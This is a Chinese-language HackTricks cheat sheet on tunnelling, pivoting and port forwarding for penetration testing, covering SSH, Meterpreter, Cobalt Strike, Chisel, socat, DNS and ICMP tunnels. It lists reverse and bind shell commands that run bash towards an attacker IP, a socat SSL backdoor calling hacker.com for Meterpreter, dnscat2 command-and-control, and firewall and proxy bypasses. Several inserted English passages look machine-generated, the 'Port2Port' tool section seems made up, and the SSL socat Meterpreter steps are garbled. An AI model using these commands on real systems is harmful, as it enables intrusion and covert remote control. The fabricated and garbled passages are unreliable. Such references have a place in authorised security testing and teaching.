# 隧道和端口转发

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks 仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud)提交 PR 来分享你的黑客技巧**。

</details>

## Nmap 提示

{% hint style="warning" %}
**ICMP** 和 **SYN** 扫描无法通过 socks 代理进行隧道传输，因此我们必须**禁用 ping 发现**（`-Pn`）并指定**TCP 扫描**（`-sT`）才能使其工作。
{% endhint %}

## **Bash**

**主机 -> 跳板 -> 内部A -> 内部B**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH图形连接（X）
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### 本地端口到端口

在SSH服务器上打开新的端口 --> 其他端口
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### 端口到端口

本地端口 --> 受损主机 (SSH) --> 第三台主机:端口
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> 受损主机（SSH） --> 任何地方
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### 反向端口转发

这对于通过 DMZ 从内部主机获取反向 shell 到您的主机非常有用：
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN隧道

您需要在两台设备上都具有**root权限**（因为您将创建新的接口），并且sshd配置必须允许root登录：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
在服务器端启用转发功能
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端上设置新的路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

您可以通过ssh将所有流量通过主机隧道传输到子网络。\
例如，将所有流量转发到10.10.10.0/24的目标。
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用私钥进行连接

To connect to a remote server using a private key, you can follow these steps:

1. Generate a private/public key pair on your local machine if you don't already have one. You can use tools like `ssh-keygen` to generate the keys.

2. Copy the public key (`id_rsa.pub`) to the remote server. You can use the `ssh-copy-id` command to do this automatically.

3. On the remote server, make sure the SSH daemon is configured to allow key-based authentication. Open the SSH configuration file (`/etc/ssh/sshd_config`) and ensure the following settings are enabled:
```
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
```

4. Restart the SSH daemon on the remote server to apply the changes.

5. Now, you can connect to the remote server using the private key. Use the `ssh` command with the `-i` option to specify the private key file:
```
ssh -i /path/to/private_key user@remote_server_ip
```

Replace `/path/to/private_key` with the actual path to your private key file, `user` with the username on the remote server, and `remote_server_ip` with the IP address or hostname of the remote server.

By using a private key for authentication, you can establish a secure and encrypted connection to the remote server without the need for a password.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### 端口到端口

本地端口 --> 受损主机（活动会话） --> 第三台主机:端口
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS（Socket Secure）是一种网络协议，用于在客户端和服务器之间建立安全的通信通道。它允许用户通过代理服务器进行连接，并将网络流量转发到目标服务器。SOCKS协议支持TCP和UDP流量，并且可以在不同的网络层级上工作。通过使用SOCKS代理，用户可以绕过网络限制和防火墙，实现匿名访问和隐私保护。
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS代理

在teamserver中打开一个端口，监听所有可以用来**通过beacon路由流量**的接口。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
在这种情况下，**端口在信标主机上打开**，而不是在团队服务器上，并且流量被发送到团队服务器，然后再发送到指定的主机:端口
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
注意：

* Beacon的反向端口转发始终将流量隧道传输到Team Server，并由Team Server将流量发送到其预定目的地，因此不应用于在个别机器之间中继流量。
* 流量通过Beacon的C2流量进行隧道传输，而不是通过单独的套接字，并且还可以在P2P链接上工作。
* 您无需成为本地管理员即可在高端口上创建反向端口转发。

### rPort2Port本地

{% hint style="warning" %}
在这种情况下，端口在beacon主机上打开，而不是在Team Server上，并且流量被发送到Cobalt Strike客户端（而不是Team Server），然后从那里发送到指定的主机：端口
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

你需要上传一个网页文件隧道：ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

您可以从[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)的发布页面下载它\
您需要使用**相同的版本用于客户端和服务器**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 端口转发

Port forwarding is a technique used to redirect network traffic from one port on a local machine to another port on a remote machine. It is commonly used in situations where direct communication between the two machines is not possible or desired.

端口转发是一种技术，用于将本地机器上的一个端口的网络流量重定向到远程机器上的另一个端口。它通常用于无法或不希望直接通信的两台机器之间的情况。

Port forwarding can be useful in various scenarios, such as:

- Accessing a service running on a remote machine through a firewall or NAT (Network Address Translation) device.
- Exposing a local service to the internet without directly exposing the machine.
- Bypassing network restrictions or censorship.

端口转发在各种场景下都很有用，例如：

- 通过防火墙或网络地址转换（NAT）设备访问在远程机器上运行的服务。
- 在不直接暴露机器的情况下，将本地服务暴露给互联网。
- 绕过网络限制或审查。

There are two main types of port forwarding:

1. Local port forwarding: This forwards traffic from a local machine's port to a remote machine's port through an SSH tunnel. It allows you to access a service running on the remote machine as if it were running on your local machine.

2. Remote port forwarding: This forwards traffic from a remote machine's port to a local machine's port through an SSH tunnel. It allows others to access a service running on your local machine as if it were running on the remote machine.

有两种主要类型的端口转发：

1. 本地端口转发：通过SSH隧道将本地机器的端口转发到远程机器的端口。它允许您访问在远程机器上运行的服务，就像它在本地机器上运行一样。

2. 远程端口转发：通过SSH隧道将远程机器的端口转发到本地机器的端口。它允许他人访问在您的本地机器上运行的服务，就像它在远程机器上运行一样。

Port forwarding can be done using various tools and protocols, such as SSH, VPNs (Virtual Private Networks), and proxy servers. The choice of tool depends on the specific requirements and constraints of the situation.

可以使用各种工具和协议来进行端口转发，例如SSH、VPN（虚拟专用网络）和代理服务器。工具的选择取决于具体的要求和限制。
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

反向隧道。隧道从受害者端启动。\
在 127.0.0.1:1080 上创建一个 socks4 代理。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过**NTLM代理**进行转发

---

### **NTLM Proxy**

An NTLM proxy is a type of proxy server that allows clients to authenticate using the NTLM authentication protocol. This can be useful for pivoting through a compromised system that has restricted outbound connections.

To pivot through an NTLM proxy, follow these steps:

1. Identify a compromised system that has access to the NTLM proxy server.
2. Set up a local proxy server on the compromised system.
3. Configure the local proxy server to forward traffic to the NTLM proxy server.
4. Configure the client to use the local proxy server for outbound connections.
5. Authenticate with the NTLM proxy server using valid credentials.
6. Once authenticated, the client can use the NTLM proxy server to access resources on the network.

Pivoting through an NTLM proxy can help bypass network restrictions and access resources that would otherwise be inaccessible. However, it is important to note that this technique should only be used in ethical hacking scenarios with proper authorization.
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 绑定 shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### 反向 shell

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands on it.

To establish a reverse shell, the attacker typically needs to have a listener running on their machine and a payload installed on the target machine. The listener waits for incoming connections from the target machine, while the payload establishes the connection and provides a command prompt on the attacker's machine.

Reverse shells can be used for various purposes in hacking, such as bypassing firewalls or gaining access to a restricted network. They are often employed in post-exploitation scenarios to maintain persistent access to a compromised system.

It is important to note that the use of reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized security assessments.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### 端口到端口

Port2Port是一种端口转发技术，用于在不同网络之间建立通信通道。它允许将一个端口的流量转发到另一个端口，从而绕过网络限制和防火墙。

#### 用法

以下是使用Port2Port进行端口转发的步骤：

1. 在本地机器上运行Port2Port客户端，并指定要转发的本地端口和目标端口。

   ```
   port2port -l <local_port> -r <remote_port>
   ```

2. 在远程机器上运行Port2Port服务器，并指定要监听的端口。

   ```
   port2port -s -p <listen_port>
   ```

3. 现在，本地机器上的流量将被转发到远程机器上的目标端口。

#### 示例

以下示例演示了如何使用Port2Port进行端口转发：

1. 在本地机器上运行Port2Port客户端，将本地的8080端口转发到远程机器的8888端口。

   ```
   port2port -l 8080 -r 8888
   ```

2. 在远程机器上运行Port2Port服务器，监听8888端口。

   ```
   port2port -s -p 8888
   ```

3. 现在，本地机器上的流量将被转发到远程机器的8888端口。

#### 注意事项

- 确保本地机器和远程机器之间可以建立网络连接。
- 确保本地机器和远程机器上的防火墙允许端口转发。
- 确保使用安全的通信协议（如SSH）来保护端口转发的流量。
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### 通过socks进行端口到端口的转发

Sometimes, you may encounter situations where you need to forward traffic from one port to another using a SOCKS proxy. This can be useful in scenarios where direct communication between two ports is not possible due to network restrictions or firewall rules.

有时候，你可能会遇到需要使用SOCKS代理将流量从一个端口转发到另一个端口的情况。这在直接通信两个端口由于网络限制或防火墙规则而不可能的情况下非常有用。

To achieve port-to-port forwarding through a SOCKS proxy, you can use tools like `socat` or `netcat`. These tools allow you to establish a connection to the SOCKS proxy and redirect traffic from one port to another.

要通过SOCKS代理实现端口到端口的转发，你可以使用`socat`或`netcat`等工具。这些工具允许你建立与SOCKS代理的连接，并将流量从一个端口重定向到另一个端口。

Here is an example of how you can use `socat` to forward traffic from port 8080 to port 8888 through a SOCKS proxy:

下面是一个使用`socat`将流量从端口8080转发到端口8888的示例，通过SOCKS代理实现：

```bash
socat TCP4-LISTEN:8080,fork SOCKS4A:proxy.example.com:8888,socksport=1080
```

In this example, `socat` listens on port 8080 and forwards incoming traffic to the SOCKS proxy at `proxy.example.com` on port 8888. The `socksport=1080` option specifies the port number of the SOCKS proxy.

在这个示例中，`socat`监听端口8080，并将传入的流量转发到位于`proxy.example.com`上的SOCKS代理的端口8888。`socksport=1080`选项指定了SOCKS代理的端口号。

You can modify the command according to your specific requirements, such as changing the source and destination ports or using a different type of SOCKS proxy.

你可以根据你的具体需求修改命令，比如更改源端口和目标端口，或者使用不同类型的SOCKS代理。

Remember to ensure that you have proper authorization and permission before performing any port forwarding activities, as unauthorized port forwarding can lead to security risks.

在执行任何端口转发操作之前，请确保你具有适当的授权和权限，因为未经授权的端口转发可能会导致安全风险。
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### 通过SSL Socat使用Meterpreter

To establish a Meterpreter session through SSL Socat, follow these steps:

1. Generate an SSL certificate and key pair using OpenSSL:
```plaintext
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem
```

2. Start a listener on the attacker machine using Socat:
```plaintext
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork TCP4:127.0.0.1:4444
```

3. On the target machine, execute the following command to connect to the attacker machine:
```plaintext
meterpreter > portfwd add -l 4444 -p 443 -r <attacker_ip>
```

4. Finally, start a Meterpreter listener on the attacker machine:
```plaintext
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost <attacker_ip>
set lport 443
exploit
```

Now, any traffic sent to the target machine's port 443 will be forwarded to the attacker machine's port 4444 through SSL Socat, allowing the establishment of a Meterpreter session.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
您可以在受害者的控制台中执行以下代码来绕过**未经身份验证的代理**，将此行替换为最后一行代码：
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat隧道

**/bin/sh控制台**

在客户端和服务器上创建证书
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### 远程端口到端口

将本地SSH端口（22）连接到攻击者主机的443端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

这是一个类似于控制台PuTTY版本的工具（选项与ssh客户端非常相似）。

由于这个二进制文件将在受害者的计算机上执行，并且它是一个ssh客户端，我们需要打开我们的ssh服务和端口，以便我们可以建立反向连接。然后，将仅本地可访问的端口转发到我们机器上的一个端口：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### 端口到端口

您需要是本地管理员（对于任何端口）
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP和Proxifier

您需要具有**系统上的RDP访问权限**。\
下载：

1. [SocksOverRDP x64二进制文件](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用Windows的远程桌面服务功能中的`Dynamic Virtual Channels`（DVC）。DVC负责**通过RDP连接进行数据包隧道传输**。
2. [Proxifier便携版二进制文件](https://www.proxifier.com/download/#win-tab)

在客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在我们可以使用`mstsc.exe`通过**RDP**连接到**受害者**，我们应该收到一个提示，提示说**SocksOverRDP插件已启用**，并且它将在**127.0.0.1:1080**上**监听**。

通过**RDP**连接并在受害者机器上上传并执行**`SocksOverRDP-Server.exe`**二进制文件：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在，在您的机器（攻击者）上确认端口1080正在监听：
```
netstat -antb | findstr 1080
```
现在你可以使用[**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量**。

## 代理化Windows GUI应用程序

您可以使用[**Proxifier**](https://www.proxifier.com/)使Windows GUI应用程序通过代理进行导航。\
在**配置文件 -> 代理服务器**中添加SOCKS服务器的IP和端口。\
在**配置文件 -> 代理规则**中添加要代理的程序名称和要代理的IP连接。

## NTLM代理绕过

之前提到的工具：**Rpivot**\
**OpenVPN**也可以绕过它，通过在配置文件中设置以下选项：
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

它对代理进行身份验证，并在本地绑定一个端口，该端口被转发到您指定的外部服务。然后，您可以通过此端口使用您选择的工具。\
例如，可以转发端口443。
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
现在，如果你在受害者的机器上将**SSH**服务设置为监听443端口，你可以通过攻击者的2222端口连接到它。\
你也可以使用一个连接到localhost:443的**meterpreter**，而攻击者则监听2222端口。

## YARP

由Microsoft创建的反向代理。你可以在这里找到它：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS隧道

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

在两个系统中都需要root权限来创建tun适配器，并使用DNS查询在它们之间进行数据隧道传输。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
隧道速度会很慢。您可以通过使用以下方法在该隧道上创建一个压缩的SSH连接：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

****[**从这里下载**](https://github.com/iagox86/dnscat2)**。**

通过DNS建立C\&C通道。不需要root权限。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

您可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 客户端：
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **使用dnscat进行端口转发**

Port forwarding is a technique used to redirect network traffic from one port on a host to another port on a different host. It can be useful in various scenarios, such as accessing a service running on a remote machine or bypassing network restrictions.

With dnscat, you can establish a covert communication channel over DNS. This allows you to tunnel traffic through DNS queries and responses, effectively bypassing firewalls and other network security measures.

To set up port forwarding with dnscat, follow these steps:

1. Install dnscat on both the client and server machines. You can find the installation instructions in the dnscat GitHub repository.

2. Start the dnscat server on the target machine using the following command:

   ```
   dnscat2 --dns <DNS_SERVER_IP>
   ```

   Replace `<DNS_SERVER_IP>` with the IP address of the DNS server you want to use.

3. On the client machine, start the dnscat client and connect to the server using the following command:

   ```
   dnscat2 --dns <DNS_SERVER_IP> --dns-port 53
   ```

   Again, replace `<DNS_SERVER_IP>` with the IP address of the DNS server.

4. Once the connection is established, you can use the `forward` command to set up port forwarding. For example, to forward traffic from port 8080 on the client machine to port 80 on the server machine, use the following command:

   ```
   forward 8080 80
   ```

   This will create a tunnel between the two ports, allowing traffic to flow between them.

5. To test the port forwarding, you can use tools like `curl` or a web browser to access the service running on the server machine. Instead of connecting directly to the server's IP address and port, you should connect to `localhost:8080` on the client machine.

Port forwarding with dnscat can be a powerful technique for bypassing network restrictions and accessing services on remote machines. However, it's important to use it responsibly and within the boundaries of the law.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 更改 proxychains 的 DNS

Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道传输 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 4.2.2.2（硬编码）。要更改它，请编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 Windows 环境中，可以设置域控制器的 IP。

## Go 中的隧道

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP 隧道

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

在两个系统中都需要 root 权限来创建 tun 适配器，并使用 ICMP 回显请求在它们之间隧道传输数据。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

****[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/)是一个可以通过一条命令将解决方案暴露到互联网的工具。**
*暴露的URI类似于：* **UID.ngrok.io**

### 安装

- 创建一个账户：https://ngrok.com/signup
- 下载客户端：
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/)。

*如果需要的话，还可以添加身份验证和TLS。*

#### TCP隧道
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 使用HTTP公开文件

One common use case for tunneling and port forwarding is to expose files using the HTTP protocol. This can be useful when you want to share files with others or access them remotely.

To expose files with HTTP, you can use a tool like `ngrok` or `localtunnel`. These tools create a secure tunnel between your local machine and a public URL, allowing you to serve files over the internet.

Here's how you can do it with `ngrok`:

1. Download and install `ngrok` from the official website.
2. Open a terminal and navigate to the directory where `ngrok` is installed.
3. Start `ngrok` by running the command `./ngrok http <port>`, where `<port>` is the port number on which your local web server is running.
4. `ngrok` will generate a public URL that you can use to access your local files over the internet. The URL will look something like `http://randomstring.ngrok.io`.
5. Share this URL with others or use it to access your files remotely.

Remember to keep your files secure and only expose them to trusted individuals.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### 嗅探HTTP请求

*对于XSS、SSRF、SSTI等非常有用*
直接从stdout或者通过HTTP接口[http://127.0.0.1:4040](http://127.0.0.1:4000)进行查看。

#### 隧道化内部HTTP服务
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml简单配置示例

它打开了3个隧道：
- 2个TCP
- 1个HTTP，从/tmp/httpbin/公开静态文件
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## 其他工具检查

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告** 吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF 版本** 吗？请查看 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
